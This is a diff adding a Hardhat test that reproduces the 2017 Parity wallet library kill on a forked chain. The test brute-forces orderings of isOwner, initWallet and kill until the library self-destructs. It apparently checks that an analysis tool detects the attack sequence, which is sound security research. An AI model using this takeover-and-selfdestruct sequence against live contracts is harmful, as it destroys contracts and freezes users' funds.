@@ -1,0 +1,62 @@
+import { expect } from 'chai'
+import { ethers, network } from 'hardhat'
+import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers'
+import { Contract } from 'ethers'
+
+describe('CCA Detects Parity Kill Test', async function () {
+    async function handleIsOwner(walletLibrary: Contract, address: string) {
+        return await walletLibrary.isOwner(address)
+    }
+
+    async function handleInitWallet(walletLibrary: Contract, address: string) {
+        const ownerArray = [address]
+        return await walletLibrary.initWallet(ownerArray, 0, 0)
+    }
+
+    async function handleKill(walletLibrary: Contract, address: string) {
+        return await walletLibrary.kill(address)
+    }
+
+    let alice: SignerWithAddress
+    let WalletLibrary: Contract
+    let walletLibraryAddress: string
+    beforeEach(async () => {
+        ;[alice] = await ethers.getSigners()
+        WalletLibrary = await ethers.getContractAt('parity', '0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4')
+        walletLibraryAddress = await WalletLibrary.getAddress()
+        expect(walletLibraryAddress).to.equal('0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4')
+    })
+    it('should block number equal to 4501735', async function () {
+        const blockNumber = await ethers.provider.getBlockNumber()
+        expect(blockNumber).to.equal(4501735)
+    })
+
+    it('should try all function call combinations to kill the wallet', async function () {
+        const actions = [handleIsOwner, handleInitWallet, handleKill]
+        for (let i = 0; i < actions.length; i++) {
+            for (let j = 0; j < actions.length; j++) {
+                for (let k = 0; k < actions.length; k++) {
+                    let code = await ethers.provider.getCode(walletLibraryAddress)
+                    let balance = await ethers.provider.getBalance(walletLibraryAddress)
+                    if (code != '0x' && i != j && i != k && j != k ) {
+                        await actions[i](WalletLibrary, alice.address)
+                        await actions[j](WalletLibrary, alice.address)
+                        await actions[k](WalletLibrary, alice.address)
+
+                        code = await ethers.provider.getCode(walletLibraryAddress)
+                        balance = await ethers.provider.getBalance(walletLibraryAddress)
+                        
+                        if (code == '0x' && balance == 0n) {
+                            console.log(
+                                `Triggering action sequence: ${actions[i].name} -> ${actions[j].name} -> ${actions[k].name}`,
+                            )
+                            return;
+                        }
+                    }
+                    
+                }
+            }
+        }
+        console.log('No selfdestruct sequence found.')
+    })
+})
